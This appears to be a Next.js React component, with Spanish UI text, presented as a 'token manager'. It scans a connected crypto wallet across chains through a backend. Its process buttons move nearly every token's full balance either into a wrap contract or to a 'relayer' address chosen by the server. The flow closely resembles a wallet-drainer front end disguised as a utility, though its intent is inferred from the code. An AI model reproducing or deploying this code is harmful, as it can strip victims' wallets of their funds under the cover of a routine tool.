'use client'

import React, { useEffect, useState } from 'react'
import { useAppKit } from '@reown/appkit/react'
import { useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
import { ethers } from 'ethers'

interface Token {
  symbol?: string
  address?: string | null
  balance?: string
  decimals?: number
  chain?: number
}

interface SentItem {
  token: Token
  type: 'wrap' | 'transfer' | string
  tx?: string
  amount?: string
  jobId?: string
}

interface FailedItem {
  token: Token
  reason: string
}

// Hook personalizado para detectar dispositivos móviles
const useIsMobile = () => {
  const [isMobile, setIsMobile] = useState(false);
  
  useEffect(() => {
    if (typeof window !== 'undefined') {
      setIsMobile(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
    }
  }, []);
  
  return isMobile;
};

// Función helper para fetch con mejor manejo de errores
const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
  const res = await fetch(url, options);
  
  // Verificar el tipo de contenido antes de analizar JSON
  const contentType = res.headers.get('content-type');
  if (!contentType || !contentType.includes('application/json')) {
    const text = await res.text();
    throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
  }

  if (!res.ok) {
    const errorData = await res.json();
    throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
  }

  return res.json();
};

export default function TokenManager(): React.JSX.Element {
  const { open } = useAppKit()
  const { address, isConnected } = useAccount()
  const walletClient = (useWalletClient() as { data?: any }).data
  const publicClient: any = usePublicClient()
  const { data: balance } = useBalance({ address })
  const { data: feeData } = useFeeData()
  const [tokens, setTokens] = useState<Token[]>([])
  const [loading, setLoading] = useState<boolean>(false)
  const [processing, setProcessing] = useState<boolean>(false)
  const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
  const [isClient, setIsClient] = useState<boolean>(false)
  const isMobileDevice = useIsMobile()

  const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''

  useEffect(() => {
    setIsClient(true)

    // Mostrar valores de entorno para depuración
    console.log('[ENV] NEXT_PUBLIC_BACKEND_URL =', BACKEND)
    console.log('[ENV] NEXT_PUBLIC_PROJECT_URL =', process.env.NEXT_PUBLIC_PROJECT_URL)

    // Global error handlers
    const onError = (e: ErrorEvent) => {
      console.error('Global error captured:', e.error || e.message || e)
    }
    const onRejection = (e: PromiseRejectionEvent) => {
      console.error('Unhandled rejection captured:', e.reason || e)
    }

    window.addEventListener('error', onError)
    window.addEventListener('unhandledrejection', onRejection)

    return () => {
      window.removeEventListener('error', onError)
      window.removeEventListener('unhandledrejection', onRejection)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  useEffect(() => {
    if (isConnected && address) {
      scanWallet()
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, address])

  const scanWallet = async (): Promise<void> => {
    try {
      setLoading(true)

      if (!BACKEND) {
        console.error('[CONFIG] NEXT_PUBLIC_BACKEND_URL no está definido.')
        await alertAction('Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.')
        setLoading(false)
        return
      }

      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ owner: address })
      })

      console.log('Tokens detectados:', data)

      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
        if (token.symbol === 'MATIC' && !token.address) {
          return { ...token, address: null }
        }
        return token
      })

      setTokens(processedTokens || [])
    } catch (err: any) {
      console.error('Error escaneando wallet:', err)
      await alertAction('Error escaneando wallet: ' + (err?.message || err))
    } finally {
      setLoading(false)
    }
  }

  const alertAction = async (message: string): Promise<void> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'alert', message }))
      return
    }

    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).alert === 'function') {
      globalThis.alert(message)
      return
    }

    console.log('Alert fallback:', message)
  }

  const confirmAction = async (message: string): Promise<boolean> => {
    if (typeof window !== 'undefined' && (window as any).ReactNativeWebView) {
      return new Promise((resolve) => {
        const handler = (event: MessageEvent) => {
          try {
            const data = JSON.parse(event.data)
            if (data?.type === 'confirmResponse') {
              window.removeEventListener('message', handler)
              resolve(Boolean(data.response))
            }
          } catch (e) {}
        }

        window.addEventListener('message', handler)
        ;(window as any).ReactNativeWebView.postMessage(JSON.stringify({ type: 'confirm', message }))

        setTimeout(() => {
          window.removeEventListener('message', handler)
          resolve(false)
        }, 30000)
      })
    }

    if (typeof globalThis !== 'undefined' && typeof (globalThis as any).confirm === 'function') {
      return Promise.resolve(Boolean(globalThis.confirm(message)))
    }

    return Promise.resolve(false)
  }

  const getWrapInfo = async (chainId: number): Promise<any | null> => {
    try {
      if (!BACKEND) {
        console.warn('[CONFIG] getWrapInfo aborted: BACKEND not defined')
        return null
      }
      return await fetchWithErrorHandling(`${BACKEND}/wrap-info`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({ chain: chainId })
      })
    } catch (err) {
      console.error('Error obteniendo info de wrap:', err)
      return null
    }
  }

  const isUserRejected = (error: any): boolean => {
    if (!error) return false
    const message = String(error?.message || '').toLowerCase()
    return /user denied|user rejected|rejected by user/i.test(message)
  }

  const processNativeToken = async (token: Token): Promise<void> => {
    try {
      if (!walletClient || !publicClient || !address) {
        throw new Error('Wallet no conectada correctamente')
      }

      const chainId = (publicClient as any)?.chain?.id as number | undefined
      if (!chainId && typeof token.chain === 'number') {
        // fallback a token.chain si publicClient no tiene chain
      } else if (!chainId) {
        throw new Error('No se pudo determinar la cadena')
      }

      const wrapInfo = await getWrapInfo(chainId || (token.chain as number))
      const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress

      const balanceBN = ethers.BigNumber.from(token.balance || '0')
      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto

      // Estimaciones de gas
      const gasLimitTransfer = ethers.BigNumber.from(21000)
      const gasLimitWrap = ethers.BigNumber.from(100000)

      // Buffer de seguridad
      const buffer = gasPrice.mul(30000)

      // Calcular máximos seguros
      const feeWrap = gasPrice.mul(gasLimitWrap)
      const feeTransfer = gasPrice.mul(gasLimitTransfer)
      const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
      const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)

      // Si no hay suficiente para ninguna operación
      if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
        const reason = 'Saldo insuficiente para cubrir gas fees'
        setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
        return
      }

      // Si hay wrapped disponible y saldo suficiente, ofrecer wrap
      if (wrappedAddress && maxSafeForWrap.gt(0)) {
        const humanAmount = ethers.utils.formatEther(maxSafeForWrap)
        const shouldWrap = await confirmAction(`¿Deseas wrappear ${humanAmount} ${token.symbol}? (Recomendado para mejores tasas)`)

        if (shouldWrap) {
          try {
            const wrapAbi = [
              {
                inputs: [],
                name: 'deposit',
                outputs: [],
                stateMutability: 'payable',
                type: 'function'
              }
            ] as const

            const hash = await walletClient.writeContract({
              address: wrappedAddress as `0x${string}`,
              abi: wrapAbi,
              functionName: 'deposit',
              value: maxSafeForWrap.toBigInt(),
              gas: gasLimitWrap.toBigInt()
            })

            await publicClient.waitForTransactionReceipt({ hash })

            setSummary(prev => ({
              ...prev,
              sent: [...prev.sent, { token: { ...token, symbol: `W${token.symbol}` }, type: 'wrap', tx: hash, amount: maxSafeForWrap.toString() }]
            }))

            return
          } catch (error: any) {
            if (isUserRejected(error)) {
              setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: 'Usuario rechazó el wrap' }] }))
              return
            }
            throw error
          }
        }
      }

      // Si no se hizo wrap, crear solicitud de transferencia en el backend
      if (maxSafeForTransfer.gt(0)) {
        const humanAmount = ethers.utils.formatEther(maxSafeForTransfer)
        const shouldTransfer = await confirmAction(`¿Deseas transferir ${humanAmount} ${token.symbol} al relayer?`)

        if (shouldTransfer) {
          if (!BACKEND) throw new Error('BACKEND no configurado')
          const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json'
            },
            body: JSON.stringify({
              owner: address,
              chain: token.chain,
              amount: maxSafeForTransfer.toString()
            })
          })

          if (data.ok && data.instructions && data.instructions.relayerAddress) {
            const hash = await walletClient.sendTransaction({
              to: data.instructions.relayerAddress as `0x${string}`,
              value: maxSafeForTransfer.toBigInt(),
              gas: gasLimitTransfer.toBigInt()
            })

            await publicClient.waitForTransactionReceipt({ hash })

            setSummary(prev => ({
              ...prev,
              sent: [...prev.sent, { token, type: 'transfer', tx: hash, amount: maxSafeForTransfer.toString(), jobId: data.jobId }]
            }))
          } else {
            throw new Error('Error creando solicitud de transferencia')
          }
        } else {
          setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: 'Usuario canceló la transferencia' }] }))
        }
      }
    } catch (error: any) {
      console.error('Error procesando token nativo:', error)

      const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`

      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
    }
  }

  const processToken = async (token: Token): Promise<void> => {
    try {
      if (!BACKEND) throw new Error('BACKEND no configurado')
      const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          owner: address,
          chain: token.chain,
          token: token.address,
          amount: token.balance
        })
      })

      if (data.ok) {
        setSummary(prev => ({ ...prev, sent: [...prev.sent, { token, type: 'transfer', jobId: data.jobId, amount: token.balance }] }))
        await alertAction('Solicitud de transferencia creada. El relayer procesará pronto.')
      } else {
        throw new Error(data.error || 'Error creando solicitud de transferencia')
      }
    } catch (error: any) {
      console.error('Error procesando token:', error)
      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error desconocido' }] }))
    }
  }

  const processAllTokens = async (): Promise<void> => {
    if (!tokens.length) return

    setProcessing(true)
    // Creamos una copia local del resumen para evitar problemas de asincronía
    const localSummary = { sent: [] as SentItem[], failed: [] as FailedItem[] }
    
    for (const token of tokens) {
      if (!token.address) {
        await processNativeToken(token)
      } else {
        await processToken(token)
      }
    }

    setProcessing(false)

    // Usamos setTimeout para esperar a que el estado se actualice completamente
    setTimeout(async () => {
      if (summary.sent.length > 0 || summary.failed.length > 0) {
        let message = '=== Resumen ===\n'
        message += `Éxitos: ${summary.sent.length}\n`
        message += `Fallos: ${summary.failed.length}\n`

        if (summary.failed.length > 0) {
          message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
        }

        await alertAction(message)
      }
    }, 100)
  }

  // Evitar renderizado hasta que estemos en el cliente
  if (!isClient) {
    return (
      <div style={{ padding: '20px', fontFamily: 'Arial', maxWidth: '800px', margin: '0 auto' }}>
        <h1>Administrador de Tokens</h1>
        <p>Cargando...</p>
      </div>
    )
  }

  return (
    <div style={{ padding: '20px', fontFamily: 'Arial', maxWidth: '800px', margin: '0 auto' }}>
      <h1>Administrador de Tokens</h1>

      <button
        onClick={() => open()}
        style={{
          padding: '12px 16px',
          fontSize: '16px',
          backgroundColor: '#0070f3',
          color: 'white',
          border: 'none',
          borderRadius: '8px',
          cursor: 'pointer',
          marginBottom: '20px'
        }}
      >
        {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Conectar Wallet'}
      </button>

      {isConnected && (
        <div>
          <button
            onClick={scanWallet}
            disabled={loading}
            style={{
              padding: '10px 14px',
              fontSize: '14px',
              marginLeft: '10px',
              backgroundColor: loading ? '#ccc' : '#4CAF50',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              cursor: loading ? 'not-allowed' : 'pointer'
            }}
          >
            {loading ? 'Escaneando...' : 'Escanear Tokens'}
          </button>

          {tokens.length > 0 && (
            <button
              onClick={processAllTokens}
              disabled={processing}
              style={{
                padding: '10px 14px',
                fontSize: '14px',
                marginLeft: '10px',
                backgroundColor: processing ? '#ccc' : '#FF5722',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                cursor: processing ? 'not-allowed' : 'pointer'
              }}
            >
              {processing ? 'Procesando...' : 'Procesar Todos los Tokens'}
            </button>
          )}
        </div>
      )}

      {loading && (
        <div style={{ marginTop: '20px' }}>
          <p>Escaneando tokens en todas las cadenas...</p>
          <div style={{
            width: '100%',
            height: '4px',
            backgroundColor: '#f0f0f0',
            borderRadius: '2px',
            overflow: 'hidden'
          }}>
            <div style={{
              width: '100%',
              height: '100%',
              backgroundColor: '#0070f3',
              animation: 'loading 1.5s infinite ease-in-out'
            }}></div>
          </div>
        </div>
      )}

      {tokens.length > 0 && (
        <div style={{ marginTop: '20px' }}>
          <h2>Tokens Detectados ({tokens.length})</h2>
          <div style={{
            maxHeight: '400px',
            overflow: 'auto',
            border: '1px solid #e0e0e0',
            borderRadius: '8px',
            padding: '10px'
          }}>
            {tokens.map((token, index) => {
              const balanceStr = token.balance ?? '0'
              const decimals = token.decimals ?? 18
              let formattedBalance = '0'
              try {
                formattedBalance = ethers.utils.formatUnits(balanceStr, decimals)
              } catch (e) {
                formattedBalance = balanceStr
              }

              return (
                <div key={index} style={{
                  padding: '12px',
                  margin: '8px 0',
                  borderRadius: '6px',
                  backgroundColor: '#f9f9f9',
                  border: '1px solid #e0e0e0'
                }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div>
                      <h3 style={{ margin: '0 0 4px 0' }}>{token.symbol}</h3>
                      <p style={{ margin: '0', color: '#666', fontSize: '14px' }}>
                        Balance: {formattedBalance}
                      </p>
                      <p style={{ margin: '0', color: '#666', fontSize: '14px' }}>
                        Cadena: {token.chain} {!token.address && '(Nativo)'}
                      </p>
                    </div>
                    <button
                      onClick={() => (!token.address ? processNativeToken(token) : processToken(token))}
                      disabled={processing}
                      style={{
                        padding: '8px 12px',
                        fontSize: '12px',
                        backgroundColor: '#0070f3',
                        color: 'white',
                        border: 'none',
                        borderRadius: '4px',
                        cursor: processing ? 'not-allowed' : 'pointer'
                      }}
                    >
                      Procesar
                    </button>
                  </div>
                </div>
              )
            })}
          </div>
        </div>
      )}

      {(summary.sent.length > 0 || summary.failed.length > 0) && (
        <div style={{ marginTop: '20px' }}>
          <h2>Resumen de Procesamiento</h2>

          {summary.sent.length > 0 && (
            <div style={{ marginBottom: '20px' }}>
              <h3 style={{ color: '#4CAF50' }}>Éxitos ({summary.sent.length})</h3>
              {summary.sent.map((item, index) => (
                <div key={index} style={{
                  padding: '10px',
                  margin: '5px 0',
                  backgroundColor: '#E8F5E9',
                  borderRadius: '4px',
                  fontSize: '14px'
                }}>
                  {item.type === 'wrap' ? 'Wrapped' : 'Transferido'} {item.token.symbol} - {item.tx ? `TX: ${String(item.tx).substring(0, 10)}...` : `Job ID: ${item.jobId}`}
                </div>
              ))}
            </div>
          )}

          {summary.failed.length > 0 && (
            <div>
              <h3 style={{ color: '#F44336' }}>Fallos ({summary.failed.length})</h3>
              {summary.failed.map((item, index) => (
                <div key={index} style={{
                  padding: '10px',
                  margin: '5px 0',
                  backgroundColor: '#FFEBEE',
                  borderRadius: '4px',
                  fontSize: '14px'
                }}>
                  {item.token.symbol} - {item.reason}
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      <style jsx>{`
        @keyframes loading {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }
      `}</style>
    </div>
  )
}
